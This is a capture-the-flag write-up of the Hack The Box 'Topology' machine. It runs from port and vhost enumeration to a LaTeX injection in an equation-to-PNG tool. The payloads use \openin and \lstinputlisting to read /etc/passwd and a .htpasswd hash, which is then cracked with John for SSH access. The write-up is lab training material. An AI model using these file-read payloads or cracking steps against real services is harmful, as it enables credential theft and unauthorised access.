![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/427ac295-7587-485b-8483-5dd74e2f46db)
#### https://app.hackthebox.com/machines/546
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I began the enumeration with quick rustscan & found only 2 open ports:

```bash
sudo rustscan -a 10.10.11.217  -- -sC -sV -vv -oN topology_nmap
```

```
- 22 # running OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
- 80 # running Apache httpd 2.4.41
```

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC65qOGPSRC7ko+vPGrMrUKptY7vMtBZuaDUQTNURCs5lRBkCFZIrXTGf/Xmg9MYZTnwm+0dMjIZTUZnQvbj4kdsmzWUOxg5Leumcy+pR/AhBqLw2wyC4kcX+fr/1mcAgbqZnCczedIcQyjjO9M1BQqUMQ7+rHDpRBxV9+PeI9kmGyF6638DJP7P/R2h1N9MuAlVohfYtgIkEMpvfCUv5g/VIRV4atP9x+11FHKae5/xiK95hsIgKYCQtWXvV7oHLs3rB0M5fayka1vOGgn6/nzQ99pZUMmUxPUrjf4V3Pa1XWkS5TSv2krkLXNnxQHoZOMQNKGmDdk0M8UfuClEYiHt+zDDYWPI672OK/qRNI7azALWU9OfOzhK3WWLKXloUImRiM0lFvp4edffENyiAiu8sWHWTED0tdse2xg8OfZ6jpNVertFTTbnilwrh2P5oWq+iVWGL8yTFeXvaSK5fq9g9ohD8FerF2DjRbj0lVonsbtKS1F0uaDp/IEaedjAeE=
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIR4Yogc3XXHR1rv03CD80VeuNTF/y2dQcRyZCo4Z3spJ0i+YJVQe/3nTxekStsHk8J8R28Y4CDP7h0h9vnlLWo=
|   256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaM68hPSVQXNWZbTV88LsN41odqyoxxgwKEb1SOPm5k
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

In the scan results I also observed that the website running on port 80 belongs to a university "Miskatonic University | Topology Group".

I then browsed through the website & found en e-mail id & domain related to the university:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d71a72b4-8a12-400d-847b-6a2b927d5211)

E-mail: lklein@topology.htb & domain: topology.htb

I added this domain to the hosts file & started running directory & vhots enumeration against it.
While enumerating through the website I found another domain "latex.topology.htb", added it to the host file & browsed through it. I found that this website provides a tool which we can use to generate the ".PNG" files from a Latex math one liner equation.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0c5c0164-4486-4685-85b1-ed14a3969b30)

In the directory enumeration I found few directories, after scanning using go buster:

```bash
gobuster dir -u http://topology.htb -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o topology_web -b 404,403 -k
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2929a9c5-3312-40fa-9744-c43264dc7e91)

After checking all of those subdirectories, I didn't found any of them as useful.

Then, I checked for the VHOSTS scanned by ffuf & found few results as well:

```bash
ffuf -H "Host: FUZZ.topology.htb" -u http://10.10.11.217 -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 6767
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5a1ebb63-e5e2-47c7-ab7a-1f7fdcc7afc3)

I added all the results to my hosts file & browsed through them.

- Stats domain just showed the image of load on the server, nothing special here.
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/85b341b8-d08f-4c4c-9f36-157197b8a850)

- dev domain popped up a login panel, which looks like if we bypass the logon panel we will get the dev enivronment access.
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/d6a4b5b3-ae11-477a-924a-552b5c769810)

I got to know from another writeup that "if HTTP sign in is enabled, we can probably find the credentials in a .htpasswd file somewhere." And since dev enivronment is active we may find it in "var/www/dec/.htpasswd".

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

Now, we already discovered that we have some latex math functionality available, I searched further for some exploit & found this [blog](https://0day.work/hacking-with-latex/) for the LFI in latex.

I followed the blog, used the below mentioned payload & found partially working in my case:

```tex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/2658c6b0-0816-4a5d-9e01-ebccdc04b318)

As per the result we can only see the first line of the result, when I tried to read the full line I got error "illegal command detected":

```tex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline 
    \text{\fileline}
\repeat
\closein\file
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/98f44329-cefc-4a39-b3e4-598470952da3)

I was stuck here & tried multiple different payloads until I found this from another writeup:

```tex
$\lstinputlisting{/etc/passwd}$
```

As per the writeup it's mentioned that "machine asks for LaTeX inline math mode. There are different modes for LaTeX present, and they would parse characters differently. If we use '$' signs, we can force the machine to process our query by switching mode for it."

So, now we have the perfectly working payload, now let's check the file content of .htpasswd. This gave us the password hash of the user 'vdaisley'.

I checked for the hash algorithm & found it's in "md5crypt-long" format. I used John the ripper to crack this hash & with a minute I got clear text password.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/8e7f3b92-3d3f-4398-a70b-b446d5903792)

```bash
john hash.txt --format=md5crypt-long -w=/usr/share/wordlists/rockyou.txt
```

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5c2443d2-56cf-427c-9f0a-5e2c12cc446c)

With the cracked credentials I was finally able to login via SSH & retrieved the user flag.(pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/802eafd8-a980-4a4f-901a-b6d5c3853064)
